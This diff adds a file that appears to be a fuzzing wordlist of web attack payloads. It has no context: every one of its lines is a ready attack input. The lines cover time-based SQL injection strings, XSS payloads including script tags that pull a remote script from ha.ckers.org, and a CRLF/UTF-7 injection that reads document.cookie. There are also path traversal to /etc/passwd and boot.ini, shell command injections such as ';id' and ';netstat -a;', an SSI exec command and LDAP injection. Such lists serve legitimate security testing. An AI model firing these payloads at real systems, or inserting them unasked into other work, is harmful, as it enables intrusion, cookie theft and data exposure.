@@ -1,0 +1,61 @@
+!@#$%^&*()
+<>
+(){}[]:;"'/-_+=\.
+%00
+\x00
+\u0000
+\x00\x00
+\u0000\u0000
+%96
+%97
+%98
+-1
+-268435455
+..%%35%63
+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+/%00/
+/%2e/
+/%2f/
+/%5c/
+%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d 
+%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i
+<a>
+<abbr>
+<acronym>
+<tfoot>
+<th>
+<thead>
+onblur
+onerror
+onfocus
+%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4
+0x7fffffff
+0x80000000
+%2A%28%7C%28objectclass%3D%2A%29%29
+%26%26+|+dir c:\
+%0A/usr/bin/id%0A
+;netstat -a;
+C:\boot.ini
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f
+/%c0%ae%c0%ae\%c0%ae%c0%ae\
+<!--#exec cmd="/bin/ls /" --><br/>
+1) or sleep(__TIME__)#
+');waitfor delay '0:0:__TIME__'--
+') or benchmark(10000000,MD5(1))#
+")) or pg_sleep(__TIME__)--
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:20' --
+x' or 1=1 or 'x'='y
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<SCRIPT>alert('XSS');</SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+'
+xsstest
+</foo>
+../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\boot.ini
+))))))))))
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+;id
+;echo 111111
